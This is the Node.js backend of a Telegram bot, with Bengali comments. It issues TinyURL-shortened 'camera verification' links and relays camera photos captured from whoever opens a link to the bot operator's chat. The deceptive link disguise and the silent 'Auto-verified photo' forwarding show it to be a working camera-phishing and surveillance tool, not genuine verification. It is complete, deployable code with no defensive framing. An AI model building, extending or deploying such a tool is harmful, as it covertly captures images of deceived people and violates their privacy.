require('dotenv').config();
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const BASE_URL = process.env.BASE_URL;

// CORS Enable (Netlify থেকে যাতে রিকোয়েস্ট আসতে পারে)
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Memory Storage: সেশন এবং ইউজার সেটিংস
const activeSessions = {}; // sessionId -> chatId
const userSettings = {};   // chatId -> { facingMode }

// --- Telegram Bot Commands ---
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  userSettings[chatId] = { facingMode: 'user' };

  const opts = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📷 Front Camera', callback_data: 'cam_front' }, { text: '📸 Back Camera', callback_data: 'cam_back' }],
        [{ text: '🔗 Generate Link', callback_data: 'gen_link' }]
      ]
    }
  };

  const statusMsg = `
🟢 *Server is Live!*

Welcome to the Camera Verification Bot.
Select camera mode and click Generate Link.
  `;
  bot.sendMessage(chatId, statusMsg, { parse_mode: 'Markdown', ...opts });
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (!userSettings[chatId]) userSettings[chatId] = { facingMode: 'user' };

  if (data === 'cam_front') {
    userSettings[chatId].facingMode = 'user';
    bot.answerCallbackQuery(query.id, { text: '✅ Front camera selected!' });
    
    // UI আপডেট করা
    bot.editMessageReplyMarkup({
      inline_keyboard: [
        [{ text: '✅ Front Camera', callback_data: 'cam_front' }, { text: '📸 Back Camera', callback_data: 'cam_back' }],
        [{ text: '🔗 Generate Link', callback_data: 'gen_link' }]
      ]
    }, { chat_id: chatId, message_id: query.message.message_id });

  } else if (data === 'cam_back') {
    userSettings[chatId].facingMode = 'environment';
    bot.answerCallbackQuery(query.id, { text: '✅ Back camera selected!' });

    // UI আপডেট করা
    bot.editMessageReplyMarkup({
      inline_keyboard: [
        [{ text: '📷 Front Camera', callback_data: 'cam_front' }, { text: '✅ Back Camera', callback_data: 'cam_back' }],
        [{ text: '🔗 Generate Link', callback_data: 'gen_link' }]
      ]
    }, { chat_id: chatId, message_id: query.message.message_id });

  } else if (data === 'gen_link') {
    const facing = userSettings[chatId].facingMode;
    
    // ইউনিক সেশন আইডি তৈরি
    const sessionId = crypto.randomBytes(4).toString('hex');
    activeSessions[sessionId] = chatId; // সেশন আইডির সাথে chatId ম্যাপ করা হলো
    
    // ফুল লিংক তৈরি
    const longLink = `${BASE_URL}/?s=${sessionId}&f=${facing}`;
    
    try {
      // TinyURL API দিয়ে লিংক শর্ট করা
      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
      const shortLink = await response.text();

      bot.sendMessage(chatId, `Here is your verification link:\n\n🔗 [Click here to open](${shortLink})\n\n*Camera:* ${facing === 'user' ? 'Front' : 'Back'}\n*Data will be sent only to this chat.*`, { parse_mode: 'Markdown' });
    } catch (err) {
      bot.sendMessage(chatId, `Error creating short link. Here is the direct link:\n${longLink}`);
    }
    
    bot.answerCallbackQuery(query.id, { text: 'Link generated!' });
  }
});

// --- API Endpoint to receive photos from Frontend ---
app.post('/api/send-photo', async (req, res) => {
  try {
    const { imageData, sessionId } = req.body;

    // চেক করা হচ্ছে সেশন আইডি ভ্যালিড কিনা
    const chatId = activeSessions[sessionId];
    if (!chatId) {
      return res.status(403).json({ error: "" });
    }

    if (!imageData) {
      return res.status(400).json({ error: "Missing image data" });
    }

    // Extract base64
    const base64Data = imageData.split(',')[1];
    const buffer = Buffer.from(base64Data, 'base64');

    // Send to Telegram (শুধু নির্দিষ্ট chatId-তে যাবে)
    await bot.sendPhoto(chatId, buffer, { caption: "📸 Auto-verified photo" });
    res.json({ success: true });

  } catch (error) {
    console.error("Error sending photo:", error);
    res.status(500).json({ error: "Failed to send photo" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});